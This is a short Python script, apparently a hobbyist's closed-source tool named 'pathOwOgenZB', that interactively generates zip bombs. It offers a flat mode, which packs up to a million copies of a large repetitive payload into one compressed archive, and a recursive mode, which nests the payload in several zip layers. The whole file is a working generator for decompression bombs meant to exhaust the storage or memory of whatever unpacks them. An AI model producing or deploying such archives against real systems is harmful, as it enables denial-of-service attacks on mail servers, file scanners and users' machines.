# This is CLOSED SOURCE software, written by Arco Nightshade.

import os
import zipfile

# Welcoming stuff and cwd finding
print("Welcome to pathOwOgenZB by Arco!")
print("Current working directory:", os.getcwd())

# Zip mode selection
while True:
    zip_mode = input("Choose mode: (1) Flat Zip Bomb, (2) Recursive Zip Bomb: ")
    if zip_mode in ["1", "2"]:
        break
    else:
        print("Enter 1 or 2.")

# Getting payload size in mb from user
size_mb = int(input("Payload size in mb (Full number): "))


# Getting payload name from user
while True:
    payload_name = input("What is the payload file's name (No spaces, extension should be .md or .txt)? ")
    if payload_name.endswith(".txt") or payload_name.endswith(".md"):
        break
    else:
        print("Please make sure it has .txt or .md at the end.")


# Getting payload contents from user
payload_contents = input("What should the payload's contents be? (Has to be at least one character): ")

if zip_mode == "1":
    while True:
        zip_name = input("Zip name (Has to end with .zip): ")
        if zip_name.endswith(".zip"):
            break
        else:
            print("Please make sure the name ends with .zip!")

    copies = int(input("How many copies of the payload should be in the final zip? (Max: 1,000,000): "))
    user_file_name = input("What should the files be named in the zip (No spaces)? ")

    def create_payload():
        with open(payload_name, "w") as F:
            F.write(payload_contents * 1024 * 1024 * size_mb)
        print(f"Final payload: {payload_name} ({size_mb}MB)")



# Function for getting the payload file and duplicating it the specific amount of times the user specified
    def zipper():
        with zipfile.ZipFile(zip_name, "w", compression=zipfile.ZIP_DEFLATED) as Z:
            for i in range(copies):
                Z.write(payload_name, arcname=f"{user_file_name}{i}.md")
                print(f"Added file {i}")
            print()
            print(f"Added {i + 1} files total")
        print(f"PathOwOgenZB Zip created: {zip_name} with {copies} files.")

    create_payload()
    zipper()
    os.remove(payload_name)
    print("Removed the payload file")

# Recursive mode
else:
    while True:
        zip_name = input("Final recursive zip bomb name (must end in .zip!)? ")
        if zip_name.endswith(".zip"):
            break
        else:
            print("Please make sure the name ends with .zip!")

    levels = int(input("HOw many recursive layers? (5-10 is usually enough): "))

    def create_payload():
        with open(payload_name, "w") as F:
            F.write(payload_contents * 1024 * 1024 * size_mb)
        print(f"Final payload: {payload_name} ({size_mb}MB)")

    def recursive_zip():
        current_zip = "OwOgen0.zip"

        with zipfile.ZipFile(current_zip, "w", compression=zipfile.ZIP_DEFLATED) as Z:
            Z.write(payload_name)

        for level in range(1, levels + 1):
            next_zip = f"OwOgen{level}.zip"
            with zipfile.ZipFile(next_zip, "w", compression=zipfile.ZIP_DEFLATED) as Z:
                Z.write(current_zip)
            print(f"Nested level {level}: {current_zip} -> {next_zip}")
            os.remove(current_zip)
            current_zip = next_zip
        
        os.rename(current_zip, zip_name)
        print(f"\nRecursive OwOgen Zip Bomb created {zip_name} with {levels} nested layers.")
        os.remove(payload_name)
        print("Removed the payload file")

    create_payload()
    print("[DEBUG] Payload file created?")
    print("Exists:", os.path.exists(payload_name))
    recursive_zip()